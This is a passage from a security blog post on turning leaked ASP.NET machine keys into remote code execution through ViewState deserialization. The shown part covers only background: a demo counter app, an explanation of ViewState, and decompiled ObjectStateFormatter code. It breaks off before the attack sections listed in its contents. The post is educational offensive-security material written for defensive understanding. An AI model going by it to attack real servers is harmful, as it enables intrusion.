<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="In this blog post we will dive into RCE via deserialization on ASP.NET via leaked machine keys"><title>Exploiting ASP.NET Leaked Machine Keys</title>
<link rel=canonical href=https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="Exploiting ASP.NET Leaked Machine Keys"><meta property='og:description' content="In this blog post we will dive into RCE via deserialization on ASP.NET via leaked machine keys"><meta property='og:url' content='https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/'><meta property='og:site_name' content='Meister'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Web'><meta property='article:tag' content='IIS'><meta property='article:published_time' content='2025-08-31T00:00:00+00:00'><meta property='article:modified_time' content='2025-08-31T00:00:00+00:00'><meta property='og:image' content='https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/featured.png'><meta name=twitter:title content="Exploiting ASP.NET Leaked Machine Keys"><meta name=twitter:description content="In this blog post we will dive into RCE via deserialization on ASP.NET via leaked machine keys"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://meister-arch.github.io/p/exploiting-asp.net-leaked-machine-keys/featured.png'><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"dark")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/m31st3r_logo_hud72c101a01177fbb4bffe2f0169d70b0_1415756_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Meister</a></h1><h2 class=site-description>I'm a guy trying to understand how hacking works</h2></div></header><ol class=menu-social><li><a href=mailto:contact@m31st3r.blog target=_blank title=Mail rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg></a></li><li><a href=https://x.com/M3ist3r_ target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/about/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#intro>Intro</a></li><li><a href=#view-state>View State</a></li><li><a href=#machine-keys>Machine Keys</a></li><li><a href=#attacking-view-state>Attacking View State</a><ol><li><ol><li><a href=#command-execution>Command Execution</a></li><li><a href=#code-execution>Code Execution</a></li></ol></li></ol></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#references>References</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/exploiting-asp.net-leaked-machine-keys/><img src=/p/exploiting-asp.net-leaked-machine-keys/featured_hud53ecb2816acf0f326204a0a8f048db6_2491440_800x0_resize_box_3.png srcset="/p/exploiting-asp.net-leaked-machine-keys/featured_hud53ecb2816acf0f326204a0a8f048db6_2491440_800x0_resize_box_3.png 800w, /p/exploiting-asp.net-leaked-machine-keys/featured_hud53ecb2816acf0f326204a0a8f048db6_2491440_1600x0_resize_box_3.png 1600w" width=800 height=533 loading=lazy alt="Featured image of post Exploiting ASP.NET Leaked Machine Keys"></a></div><div class=article-details><header class=article-category><a href=/categories/exploitation/>Exploitation</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/exploiting-asp.net-leaked-machine-keys/>Exploiting ASP.NET Leaked Machine Keys</a></h2><h3 class=article-subtitle>In this blog post we will dive into RCE via deserialization on ASP.NET via leaked machine keys</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Aug 31, 2025</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>13 minute read</time></div></footer></div></header><section class=article-content><h2 id=intro>Intro</h2><p>Recently at work, I participated in a purple teaming exercise that was focused on IIS compromise. In this scenario the web.config of the server had been leaked and the question was: what an attacker could do with this information? My eyes went straight the db credentials and I called it a day.</p><p>Well, db credentials wasn&rsquo;t the worse part. You know that if the asp.net machine keys are leaked, this can turn into a RCE?</p><p>This is the story behind this blog post. Of course it is not a new technique, but I would like to share my understanding of the subject and use it as my first blog post :-)</p><p>The goal of the post is:</p><ul><li>Understand what ViewState is.</li><li>The role of the machine keys.</li><li>Show how a machine key leak can lead to RCE.</li></ul><p>We&rsquo;ll be configuring a PoC server along the way.</p><h2 id=view-state>View State</h2><p>Let&rsquo;s start with Microsoft oficial documentation about what is view state:</p><p>&ldquo;View state is the method that the ASP.NET page framework uses to preserve page and control values between round trips. When the HTML markup for the page is rendered, the current state of the page and values that must be retained during postback are serialized into base64-encoded strings. This information is then put into the view state hidden field or fields.&rdquo;</p><p>As stated by Microsoft, View State is the mechanism which ASP.NET pages and controls use to mantain the state during postbacks (when we resend a request in the same page to be processed by the server). The term “control” is not very explanatory. Simply put, it refers to elements like a “button” or “text” on an HTML page (<a class=link href=https://www.tutorialspoint.com/asp.net/asp.net_basic_controls.htm target=_blank rel=noopener>see more here</a>) .The technology was projected to retain the information on the same page rather than cross pages, also solves the problem of HTTP being stateless.</p><p>The value is stored on the client side through a &ldquo;hidden&rdquo; field called <code>__VIEWSTATE</code> in HTML, like this:</p><p><img src=/p/exploiting-asp.net-leaked-machine-keys/img/image1.png width=1408 height=150 srcset="/p/exploiting-asp.net-leaked-machine-keys/img/image1_hu18ad06606b66ea4d492a5262e5af4a72_18606_480x0_resize_box_3.png 480w, /p/exploiting-asp.net-leaked-machine-keys/img/image1_hu18ad06606b66ea4d492a5262e5af4a72_18606_1024x0_resize_box_3.png 1024w" loading=lazy alt="figure 1 - view state in HTML" class=gallery-image data-flex-grow=938 data-flex-basis=2252px></p><p>To better understand, let&rsquo;s build a tiny sample app. It&rsquo;s purpose is to count how many times the user clicks the button &ldquo;Increment&rdquo;. Given that HTTP is a stateless protocol, this magic will be done by the view state.</p><p>On a developer machine with Visual Studio, I will be using the <code>ASP.NET Web Application (.NET Framework)</code> template.</p><p>As I am not an ASP.NET developer, with a little googling and chagpt I put together this code:</p><p><strong>Front-End</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=err>&lt;</span>%@ Page Language=&#34;C#&#34; AutoEventWireup=&#34;true&#34; CodeBehind=&#34;Default.aspx.cs&#34; Inherits=&#34;ViewMyState._Default&#34; %&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span> <span class=na>runat</span><span class=o>=</span><span class=s>&#34;server&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>ViewState Counter Demo<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;form1&#34;</span> <span class=na>runat</span><span class=o>=</span><span class=s>&#34;server&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>div</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;font-family:Segoe UI; margin:20px;&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>asp:Label</span> 
</span></span><span class=line><span class=cl>              <span class=na>ID</span><span class=o>=</span><span class=s>&#34;lblCount&#34;</span> 
</span></span><span class=line><span class=cl>              <span class=na>runat</span><span class=o>=</span><span class=s>&#34;server&#34;</span> 
</span></span><span class=line><span class=cl>              <span class=na>Font-Size</span><span class=o>=</span><span class=s>&#34;Large&#34;</span> 
</span></span><span class=line><span class=cl>              <span class=na>Text</span><span class=o>=</span><span class=s>&#34;Clicks: 0&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>br</span> <span class=p>/&gt;&lt;</span><span class=nt>br</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>asp:Button</span> 
</span></span><span class=line><span class=cl>              <span class=na>ID</span><span class=o>=</span><span class=s>&#34;btnIncrement&#34;</span> 
</span></span><span class=line><span class=cl>              <span class=na>runat</span><span class=o>=</span><span class=s>&#34;server&#34;</span> 
</span></span><span class=line><span class=cl>              <span class=na>Text</span><span class=o>=</span><span class=s>&#34;Increment&#34;</span> 
</span></span><span class=line><span class=cl>              <span class=na>OnClick</span><span class=o>=</span><span class=s>&#34;btnIncrement_Click&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>Back-End</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C# data-lang=C#><span class=line><span class=cl><span class=k>using</span> <span class=nn>System</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Collections.Generic</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Linq</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Web</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Web.UI</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Web.UI.WebControls</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nn>ViewMyState</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kd>partial</span> <span class=k>class</span> <span class=nc>_Default</span> <span class=p>:</span> <span class=n>System</span><span class=p>.</span><span class=n>Web</span><span class=p>.</span><span class=n>UI</span><span class=p>.</span><span class=n>Page</span> 
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>protected</span> <span class=k>void</span> <span class=n>Page_Load</span><span class=p>(</span><span class=kt>object</span> <span class=n>sender</span><span class=p>,</span> <span class=n>EventArgs</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(!</span><span class=n>IsPostBack</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>ViewState</span><span class=p>[</span><span class=s>&#34;ClickCount&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=m>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>protected</span> <span class=k>void</span> <span class=n>btnIncrement_Click</span><span class=p>(</span><span class=kt>object</span> <span class=n>sender</span><span class=p>,</span> <span class=n>EventArgs</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kt>int</span> <span class=n>count</span> <span class=p>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>ViewState</span><span class=p>[</span><span class=s>&#34;ClickCount&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=n>count</span><span class=p>++;</span>
</span></span><span class=line><span class=cl>            <span class=n>ViewState</span><span class=p>[</span><span class=s>&#34;ClickCount&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=n>count</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>lblCount</span><span class=p>.</span><span class=n>Text</span> <span class=p>=</span> <span class=s>$&#34;Clicks: {count}&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>In Visual Studio <em>Build -> Publish</em> it is possible to &ldquo;compile&rdquo; this application. There are various options to publish this application, including Azure, Docker, FTP, Folder etc. To save the application locally, I&rsquo;ll be using the Folder option.</p><p><img src=/p/exploiting-asp.net-leaked-machine-keys/img/img2.png width=529 height=240 srcset="/p/exploiting-asp.net-leaked-machine-keys/img/img2_hu384a5c67821f066d14a352e1eb43ca8b_10784_480x0_resize_box_3.png 480w, /p/exploiting-asp.net-leaked-machine-keys/img/img2_hu384a5c67821f066d14a352e1eb43ca8b_10784_1024x0_resize_box_3.png 1024w" loading=lazy alt="figure 2 - Visual Studio Publish " class=gallery-image data-flex-grow=220 data-flex-basis=529px></p><p>The final structure of the folder should be similar to this:</p><p><img src=/p/exploiting-asp.net-leaked-machine-keys/img/img3.png width=469 height=308 srcset="/p/exploiting-asp.net-leaked-machine-keys/img/img3_hu321b06beb3f8ddd19a2b70f6931a4b90_24121_480x0_resize_box_3.png 480w, /p/exploiting-asp.net-leaked-machine-keys/img/img3_hu321b06beb3f8ddd19a2b70f6931a4b90_24121_1024x0_resize_box_3.png 1024w" loading=lazy alt="figure 3 - Folder Structure " class=gallery-image data-flex-grow=152 data-flex-basis=365px></p><p>Transfering this folder to a Windows Server 2022 with IIS installed, I&rsquo;ll create a new site on port 8080. Browsing to it we have this:</p><p><img src=/p/exploiting-asp.net-leaked-machine-keys/img/img4.png width=306 height=160 srcset="/p/exploiting-asp.net-leaked-machine-keys/img/img4_hu89e5cfbaab34f29f28d85f23e041bec3_7470_480x0_resize_box_3.png 480w, /p/exploiting-asp.net-leaked-machine-keys/img/img4_hu89e5cfbaab34f29f28d85f23e041bec3_7470_1024x0_resize_box_3.png 1024w" loading=lazy alt="figure 4 - ViewState Demo " class=gallery-image data-flex-grow=191 data-flex-basis=459px></p><p>Upon clicking &ldquo;Increment&rdquo; the number of clicks increases.</p><p><img src=/p/exploiting-asp.net-leaked-machine-keys/img/img5.png width=305 height=163 srcset="/p/exploiting-asp.net-leaked-machine-keys/img/img5_hub289f9ba960a58e82401974bdbb3c5e6_7526_480x0_resize_box_3.png 480w, /p/exploiting-asp.net-leaked-machine-keys/img/img5_hub289f9ba960a58e82401974bdbb3c5e6_7526_1024x0_resize_box_3.png 1024w" loading=lazy alt="figure 5 - ViewState Demo(2) " class=gallery-image data-flex-grow=187 data-flex-basis=449px></p><p>Using burpsuite, we see that in every response the <code>__VIEWSTATE</code> is returned by the application:</p><p><img src=/p/exploiting-asp.net-leaked-machine-keys/img/img6.png width=640 height=271 srcset="/p/exploiting-asp.net-leaked-machine-keys/img/img6_hu561ac70af2151999207a196080c06a57_45570_480x0_resize_box_3.png 480w, /p/exploiting-asp.net-leaked-machine-keys/img/img6_hu561ac70af2151999207a196080c06a57_45570_1024x0_resize_box_3.png 1024w" loading=lazy alt="figure 6 - BurpSuite ViewState " class=gallery-image data-flex-grow=236 data-flex-basis=566px></p><blockquote><p>It is important to clarify a common misconception: view state is not used to save the values of controls during postback. In reality, these values are loaded during the &ldquo;Load Postback Data&rdquo; phase of the ASP.NET processing pipeline. What needs to be stored in the view state is any programmatic changes to the page&rsquo;s state. Read more about this process in <a class=link href="https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/ms972976%5c%28v=msdn.10%5c%29" target=_blank rel=noopener>Understanding ASP.NET View State | Microsoft Learn</a></p></blockquote><p>Ok, at this point we&rsquo;ve seen the practical use of view state. Lets talk a little bit about how the serialization/deserialization process is involved in this subject. I&rsquo;ll skip the crypto aspect of the following methods as it will be covered in the machine keys section.</p><p>When we send this serialized view state to the application, it will be handled by the <code>ObjectStateFormatter</code> class, more specifically the <code>Deserialize</code> method, present on <code>system.web.dll</code>.</p><p>In some articles and documentation, it is common to find information that this process is handled by the LOSFormatter class. This is the case when dealing with older ASP.NET (version 1.X). In version 2.0 (and higher), the class being used for this purpose is ObjectStateFormatter <a class=link href=https://learn.microsoft.com/en-us/aspnet/web-forms/overview/moving-to-aspnet-20/server-controls target=_blank rel=noopener>reference</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C# data-lang=C#><span class=line><span class=cl><span class=kd>private</span> <span class=kt>object</span> <span class=n>Deserialize</span><span class=p>(</span><span class=kt>string</span> <span class=n>inputString</span><span class=p>,</span> <span class=n>Purpose</span> <span class=n>purpose</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>String</span><span class=p>.</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=n>inputString</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>ArgumentNullException</span><span class=p>(</span><span class=s>&#34;inputString&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kt>byte</span><span class=p>[]</span> <span class=n>inputBytes</span> <span class=p>=</span> <span class=n>Convert</span><span class=p>.</span><span class=n>FromBase64String</span><span class=p>(</span><span class=n>inputString</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>length</span> <span class=p>=</span> <span class=n>inputBytes</span><span class=p>.</span><span class=n>Length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>object</span> <span class=n>result</span> <span class=p>=</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>MemoryStream</span> <span class=n>objectStream</span> <span class=p>=</span> <span class=n>GetMemoryStream</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>objectStream</span><span class=p>.</span><span class=n>Write</span><span class=p>(</span><span class=n>inputBytes</span><span class=p>,</span> <span class=m>0</span><span class=p>,</span> <span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>objectStream</span><span class=p>.</span><span class=n>Position</span> <span class=p>=</span> <span class=m>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=p>=</span> <span class=n>Deserialize</span><span class=p>(</span><span class=n>objectStream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>finally</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ReleaseMemoryStream</span><span class=p>(</span><span class=n>objectStream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>To demonstrate this, we can use dnspy debuger, attach to the worker process (w3wp.exe) and set a breakpoint on this method. By making a new request we observe that the value being decoded matches the one present in the view state field.</p><p><img src=/p/exploiting-asp.net-leaked-machine-keys/img/img7.png width=614 height=130 srcset="/p/exploiting-asp.net-leaked-machine-keys/img/img7_hu8d10f733e24d0afd498358b79ed73b9a_21747_480x0_resize_box_3.png 480w, /p/exploiting-asp.net-leaked-machine-keys/img/img7_hu8d10f733e24d0afd498358b79ed73b9a_21747_1024x0_resize_box_3.png 1024w" loading=lazy alt="figure 7 - BurpSuite Request " class=gallery-image data-flex-grow=472 data-flex-basis=1133px></p><p><img src=/p/exploiting-asp.net-leaked-machine-keys/img/img8.png width=1345 height=401 srcset="/p/exploiting-asp.net-leaked-machine-keys/img/img8_hub7bede9739a9f619334a50b44df812fb_59161_480x0_resize_box_3.png 480w, /p/exploiting-asp.net-leaked-machine-keys/img/img8_hub7bede9739a9f619334a50b44df812fb_59161_1024x0_resize_box_3.png 1024w" loading=lazy alt="figure 8 - DnSpy Debug " class=gallery-image data-flex-grow=335 data-flex-basis=804px></p><p>Then the deserialization process yields an object that is passed to the application, it&rsquo;s logic applied and the object is serialized back into the response.</p><p>In the same class, the method <code>Serialize</code> will be used for this purpose:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C# data-lang=C#><span class=line><span class=cl><span class=kd>private</span> <span class=kt>string</span> <span class=n>Serialize</span><span class=p>(</span><span class=kt>object</span> <span class=n>stateGraph</span><span class=p>,</span> <span class=n>Purpose</span> <span class=n>purpose</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>string</span> <span class=n>result</span> <span class=p>=</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>MemoryStream</span> <span class=n>memoryStream</span> <span class=p>=</span> <span class=n>ObjectStateFormatter</span><span class=p>.</span><span class=n>GetMemoryStream</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=k>try</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>this</span><span class=p>.</span><span class=n>Serialize</span><span class=p>(</span><span class=n>memoryStream</span><span class=p>,</span> <span class=n>stateGraph</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>memoryStream</span><span class=p>.</span><span class=n>SetLength</span><span class=p>(</span><span class=n>memoryStream</span><span class=p>.</span><span class=n>Position</span><span class=p>);</span>
